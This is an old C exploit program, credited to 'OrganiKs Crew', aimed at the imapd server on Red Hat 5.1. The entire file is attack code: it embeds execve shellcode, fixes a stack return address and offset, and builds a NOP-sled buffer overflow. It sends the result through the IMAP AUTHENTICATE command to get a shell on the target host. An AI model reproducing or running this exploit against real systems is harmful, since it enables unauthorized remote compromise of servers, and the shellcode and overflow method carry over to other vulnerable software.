/* OrganiKs Crew */
/* Imapd of redhat 5.1 exploit By Lionel */
/*
 * RET_POS=1028
 * OFFSET=1325
 * OVER_BUFF=4096
 * RET_POS=bffff52D  
 */

#include <stdlib.h>
#include <stdio.h>

#define RET_POS 1028

#define RETURN_ADDRESS 0xbffff52D

char overflow_buff[4096];

char shellcode[]= /* shellcode of SNT-BOF.txt */
  "\xEB\x2C\x5B\x89\xD9\x80\xC1\x06\x39\xD9\x7C\x07\x80\x01\x20\xFE\xC9\xEB"
  "\xF5\x89\x5B\x08\x31\xC0\x88\x43\x07\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D"
  "\x53\x0C\xCD\x80\x31\xC0\xFE\xC0\xCD\x80\xE8\xCF\xFF\xFF\xFF\x0f\x42\x49"
  "\x4e\x0f\x53\x48";

int main ()
{
unsigned char overflow_buf[4096];
unsigned long *ret;
int a,ctr;
memset(overflow_buf,0x90,sizeof(overflow_buf)); 
a=0;
for (ctr=(RET_POS-strlen(shellcode));ctr<(RET_POS);ctr++)
  overflow_buf[ctr]=shellcode[a++];
overflow_buf[RET_POS+4]=0;
ret=(unsigned long *)(overflow_buf+RET_POS);
*ret=RETURN_ADDRESS;
printf("* AUTHENTICATE {%d}\n",strlen(overflow_buf));
printf("%s\r\n",overflow_buf);

}
